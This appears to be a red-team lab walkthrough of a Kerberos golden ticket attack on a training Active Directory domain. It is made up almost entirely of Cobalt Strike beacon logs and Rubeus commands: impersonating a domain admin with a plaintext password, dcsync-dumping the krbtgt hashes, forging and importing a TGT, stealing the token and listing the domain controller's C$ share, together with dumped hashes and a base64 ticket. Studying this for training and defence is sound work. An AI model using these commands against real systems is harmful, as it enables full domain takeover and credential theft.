A "golden ticket" is a forged TGT, signed by the domain's krbtgt account.  Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine.  A golden ticket can be used to impersonate any user, to any service, on any machine in the domain; and to add insult to injury - the underlying credentials are never changed automatically.  For that reason, the `krbtgt NTLM/AES hash` is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently).

A common method for obtaining the krbtgt hash is to use dcsync from the context of a domain admin.

in this case in order to begin the `golden ticket` attack `make_token DEV\nlamb` who is a `DA` on either `WKSTN-1` or `WKSTN-2` to `dcsync dev.cyberbotic.io DEV\krbtgt`
- rip the `Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502` and `aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e` to create the ticket
```powershell
[12/20 23:43:25] beacon> make_token DEV\nlamb F3rrari
[12/20 23:43:25] [*] Tasked beacon to create a token for DEV\nlamb
[12/20 23:43:27] [+] host called home, sent: 35 bytes
[12/20 23:43:27] [+] Impersonated DEV\nlamb (netonly)
[12/20 23:43:30] beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[12/20 23:43:30] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[12/20 23:43:31] [+] host called home, sent: 313667 bytes
[12/20 23:43:41] [+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 550703b3096dce5b5bdc9b735b79ee30

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : 629189372a372fda

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  82d27e18e5a51b359151719075b8efe6
    02  cacfaa14338412f71c5fc49ab4e1d50f
    03  a7ec666072cde603a927ed8ac683c337
    04  82d27e18e5a51b359151719075b8efe6
    05  cacfaa14338412f71c5fc49ab4e1d50f
    06  9e5eb5ea22776f75944637a664825a15
    07  82d27e18e5a51b359151719075b8efe6
    08  c723218f35f1568e2916d31e9bf9a7bf
    09  c723218f35f1568e2916d31e9bf9a7bf
    10  8131eb31cbeb570d96532ae55dbfa418
    11  1481ee3e83e68c4a4568e05758f01780
    12  c723218f35f1568e2916d31e9bf9a7bf
    13  2a730dd5bcc9b3561acfc500d6e855d3
    14  1481ee3e83e68c4a4568e05758f01780
    15  098e6f209b48d9d3338075ae91a37d44
    16  098e6f209b48d9d3338075ae91a37d44
    17  83834e22cfe70b6d2e17612840873048
    18  0542f8bf328626961ece6ffe2f7e104b
    19  c056ce79490f266b9379e9777fa482a0
    20  70850aab87c42c75b60f8084c2c19901
    21  7c4c9dc2a43a232fec42280344fdce23
    22  7c4c9dc2a43a232fec42280344fdce23
    23  6cd9bcf9e63591df5d18f9de3c972af5
    24  73a23dbb97eac22f5075dc9781d7721b
    25  73a23dbb97eac22f5075dc9781d7721b
    26  8ae72fdbb2e6cea2b017c90856891cad
    27  a6dc866ec7b1ccdce86cea695c74ccaf
    28  87664d84ea3a2993101d13f2b2825a9e
    29  bd839cda643ebdb4e8974ac010270395
```
on `Attacker Desktop` Powershell session
```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'nlamb@dev.cyberbotic.io'

[*] AuthTime       : 20/12/2023 23:47:24
[*] StartTime      : 20/12/2023 23:47:24
[*] EndTime        : 21/12/2023 09:47:24
[*] RenewTill      : 27/12/2023 23:47:24

[*] base64(ticket.kirbi):

      doIFLzCCBSugAwIBBaEDAgEWooIEEzCCBA9hggQLMIIEB6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCA8EwggO9oAMCARKhAwIBA6KCA68EggOratOIVjtimLHg4RStifL2iCDHu3m83F2ckJTWIIVUfmS5bjm8c7sq1IVAT8Fjs3V9LNvC/38rto7Sqv0i4vSS1OKfOIVETJ3P+agcwB1BNl8mq0qDqll+Qgoe83i/Vd9RaUyx64K0cFvgklo22oecfHbScubnemTSaa95+dXwyoSiw4HNJo6rGWj1N2HOHHlEufGsQVZMKuudEzH3tq7HP0s9maxVIMoIRwbGQ7fQZIwmy+Jp4DSVSbjziUvcIDyDIR+5HloufJk0HV20vw80iLswGfVkYS/Lxdx2HCJ5yPtLGbnggv/eTFoG6OX8xjxDFG8WDacEDhDS5X5xiivUYjlhLbzONiQgDnsOzAHcLeKNJE+hqGXXoDbUgaG7+wf+o5rXBmjPP/ukjr5WYjmMqrJ5k6kSRtD5VO58AgtjjIFfMUT1R05/nQxyxAg6aCF4mAmMfwJ5njYlghWK+hKIS4HBYrTaZbW3QPUwNf4Dqw1B/stT/9wt6moebfEbhZD6oiggvcY3zRfrYwitzJt3Bc8knPN96IkPzbw8nG2W4c8NBsUWmnhQrzgwCVMQsHfqQQLx65FOAp8g6g3Ww0gWRUt93Jxmnf+wvLz36/Qt7Iu34XvKH/AoS4Uzlmj3R4M+Hb6befHEhuRltpZA4/8wyRAIcdc4l/O2BkOGLVsux3uu+/w9T5QpIxKwdOIgNo1z3jZBg1q4CWJqC+nrjM5ODzQ/WC9I0Qcb8IF9eqx5ryRngNPf2QW8c6RSU9cUsLGxoCiHW2dTvuoR0yZHJTveFUXpCzaO/F7OID7WGKFLV3aqkW8zpJqF2TYJeNG5vRDrwTRdxfMrWXLW3O5pSgebXY5d1CXliU6YhhaAUT1hGvWfAvlRYYNqvHBdu5kvMpmVncbFTJpLB0qc+KVWqncn2wHQf7KuINk6jB3jzC/oZlX78IzLsoPbPjYvOZH9TRj1Z4net2YpXo15dL8d4KHuYMnpFAfwe6Txt7BoFhd5/8EfeajvglP1GLSdlWFdlYQrTD08rIrhZVVmLu4rvf6iL791spddFhmSGneI7E56omnmOQiwafrF00aSTreMW9eJImiI5L1LbHLhNQgbR7ICLYGciSTrQhLBQD6ghPwjuDdTDk1MKJSFsceNblgYXBO77D5XKqQvzReBndH8u4vp3EK6oFi8+sN+bHfyiI5fA2k8q0YscjXh/Aa1PppPNyi4fsJlLBQC9bdzEGFmUwcreFDJPtTbt2oYwKYVo4IBBjCCAQKgAwIBAKKB+gSB932B9DCB8aCB7jCB6zCB6KArMCmgAwIBEqEiBCANQnCInl24SXnEYSrRCQsdgknoy4NwAoOiC1KTY8fk+qETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBA4AAApBEYDzIwMjMxMjIwMjM0NzI0WqURGA8yMDIzMTIyMDIzNDcyNFqmERgPMjAyMzEyMjEwOTQ3MjRapxEYDzIwMjMxMjI3MjM0NzI0WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=
```
import the ticket on `WKSTN-1` or `WKSTN-2` beacons

```powershell
[12/20 23:49:24] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLzCCBSugAwIBBaEDAgEWooIEEzCCBA9hggQLMIIEB6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCA8EwggO9oAMCARKhAwIBA6KCA68EggOratOIVjtimLHg4RStifL2iCDHu3m83F2ckJTWIIVUfmS5bjm8c7sq1IVAT8Fjs3V9LNvC/38rto7Sqv0i4vSS1OKfOIVETJ3P+agcwB1BNl8mq0qDqll+Qgoe83i/Vd9RaUyx64K0cFvgklo22oecfHbScubnemTSaa95+dXwyoSiw4HNJo6rGWj1N2HOHHlEufGsQVZMKuudEzH3tq7HP0s9maxVIMoIRwbGQ7fQZIwmy+Jp4DSVSbjziUvcIDyDIR+5HloufJk0HV20vw80iLswGfVkYS/Lxdx2HCJ5yPtLGbnggv/eTFoG6OX8xjxDFG8WDacEDhDS5X5xiivUYjlhLbzONiQgDnsOzAHcLeKNJE+hqGXXoDbUgaG7+wf+o5rXBmjPP/ukjr5WYjmMqrJ5k6kSRtD5VO58AgtjjIFfMUT1R05/nQxyxAg6aCF4mAmMfwJ5njYlghWK+hKIS4HBYrTaZbW3QPUwNf4Dqw1B/stT/9wt6moebfEbhZD6oiggvcY3zRfrYwitzJt3Bc8knPN96IkPzbw8nG2W4c8NBsUWmnhQrzgwCVMQsHfqQQLx65FOAp8g6g3Ww0gWRUt93Jxmnf+wvLz36/Qt7Iu34XvKH/AoS4Uzlmj3R4M+Hb6befHEhuRltpZA4/8wyRAIcdc4l/O2BkOGLVsux3uu+/w9T5QpIxKwdOIgNo1z3jZBg1q4CWJqC+nrjM5ODzQ/WC9I0Qcb8IF9eqx5ryRngNPf2QW8c6RSU9cUsLGxoCiHW2dTvuoR0yZHJTveFUXpCzaO/F7OID7WGKFLV3aqkW8zpJqF2TYJeNG5vRDrwTRdxfMrWXLW3O5pSgebXY5d1CXliU6YhhaAUT1hGvWfAvlRYYNqvHBdu5kvMpmVncbFTJpLB0qc+KVWqncn2wHQf7KuINk6jB3jzC/oZlX78IzLsoPbPjYvOZH9TRj1Z4net2YpXo15dL8d4KHuYMnpFAfwe6Txt7BoFhd5/8EfeajvglP1GLSdlWFdlYQrTD08rIrhZVVmLu4rvf6iL791spddFhmSGneI7E56omnmOQiwafrF00aSTreMW9eJImiI5L1LbHLhNQgbR7ICLYGciSTrQhLBQD6ghPwjuDdTDk1MKJSFsceNblgYXBO77D5XKqQvzReBndH8u4vp3EK6oFi8+sN+bHfyiI5fA2k8q0YscjXh/Aa1PppPNyi4fsJlLBQC9bdzEGFmUwcreFDJPtTbt2oYwKYVo4IBBjCCAQKgAwIBAKKB+gSB932B9DCB8aCB7jCB6zCB6KArMCmgAwIBEqEiBCANQnCInl24SXnEYSrRCQsdgknoy4NwAoOiC1KTY8fk+qETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBA4AAApBEYDzIwMjMxMjIwMjM0NzI0WqURGA8yMDIzMTIyMDIzNDcyNFqmERgPMjAyMzEyMjEwOTQ3MjRapxEYDzIwMjMxMjI3MjM0NzI0WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=
[12/20 23:49:29] [+] host called home, sent: 554416 bytes
[12/20 23:49:44] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[12/20 23:49:44] [+] received output:

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4080
[+] Ticket successfully imported!
[+] LUID            : 0x7190b6
```
unable to browse `dc-2` with `SYSTEM` on `WKSTN-2`
```powershell
beacon> ls \\dc-2.dev.cyberbotic.io\c$
[*] Tasked beacon to list files in \\dc-2.dev.cyberbotic.io\c$
[+] host called home, sent: 45 bytes
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```
`steal_token` of the golden ticket and now we are able to view `dc-2` directory.
```powershell
beacon> steal_token 4080
[*] Tasked beacon to steal token from PID 4080
[+] host called home, sent: 12 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
```

```powershell
beacon> ls \\dc-2.dev.cyberbotic.io\c$
[*] Tasked beacon to list files in \\dc-2.dev.cyberbotic.io\c$
[+] host called home, sent: 45 bytes
[*] Listing: \\dc-2.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:25:37   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     12/19/2023 21:47:58   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/26/2023 09:28:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 181b     fil     11/04/2022 11:31:03   CheckServiceHealth.ps1
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     12/20/2023 20:20:20   DumpStack.log.tmp
 384mb    fil     12/20/2023 20:20:20   pagefile.sys

```